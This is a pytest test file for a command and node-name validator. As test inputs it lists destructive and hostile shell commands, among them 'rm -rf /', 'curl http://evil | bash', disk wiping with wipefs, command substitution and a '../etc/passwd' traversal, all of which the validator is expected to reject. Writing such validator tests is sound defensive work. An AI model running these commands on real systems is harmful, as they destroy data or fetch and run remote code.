"""Tests for utils.validation — srdev1 S5 / S10.

Import the module file directly so we do not pull app.utils.__init__
(httpx and other runtime deps) into a minimal pytest venv.
"""
import importlib.util
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
_VAL_PATH = _ROOT / "app" / "utils" / "validation.py"
_spec = importlib.util.spec_from_file_location("ovox_validation", _VAL_PATH)
validation = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
sys.modules["ovox_validation"] = validation
_spec.loader.exec_module(validation)

validate_command = validation.validate_command
strip_ansi = validation.strip_ansi
validate_node_name = validation.validate_node_name


def test_validate_command_allows_safe():
    assert validate_command("whoami") == "whoami"
    assert validate_command("puppet agent -t") == "puppet agent -t"
    assert "hostname" in validate_command("/usr/bin/hostname -f")


def test_validate_command_rejects_rm_rf():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("rm -rf /")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("sudo rm -rf /var/lib/puppet")


def test_validate_command_rejects_substitution():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("echo $(id)")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("echo `id`")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("echo ${HOME}")


def test_validate_command_rejects_curl_pipe_sh():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("curl http://evil | bash")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("wget http://evil && curl http://x")


def test_validate_command_rejects_eval_and_interpreters():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("eval evil")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("python3 -c 'import os; os.system(\"x\")'")


def test_validate_command_rejects_empty_and_long():
    with pytest.raises(ValueError):
        validate_command("")
    with pytest.raises(ValueError, match="too long"):
        validate_command("x" * 2001)
    with pytest.raises(ValueError, match="control"):
        validate_command("whoami\x00")


def test_validate_command_allowlist():
    assert validate_command("whoami", allowed_commands=["whoami"]) == "whoami"
    with pytest.raises(ValueError, match="not allowed"):
        validate_command("id", allowed_commands=["whoami"])


def test_strip_ansi_removes_escapes():
    colored = "\x1b[31mred\x1b[0m"
    assert strip_ansi(colored) == "red"
    assert "\x1b" not in strip_ansi("plain")


def test_validate_node_name_rejects_traversal():
    assert validate_node_name("agent1.example.com")
    with pytest.raises(ValueError):
        validate_node_name("../etc/passwd")
    with pytest.raises(ValueError):
        validate_node_name("bad;name")


def test_validate_command_rejects_wipefs_and_device_write():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("wipefs -a /dev/sda")
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("echo x > /dev/sda1")


def test_validate_command_rejects_shutdown():
    with pytest.raises(ValueError, match="dangerous"):
        validate_command("shutdown -h now")
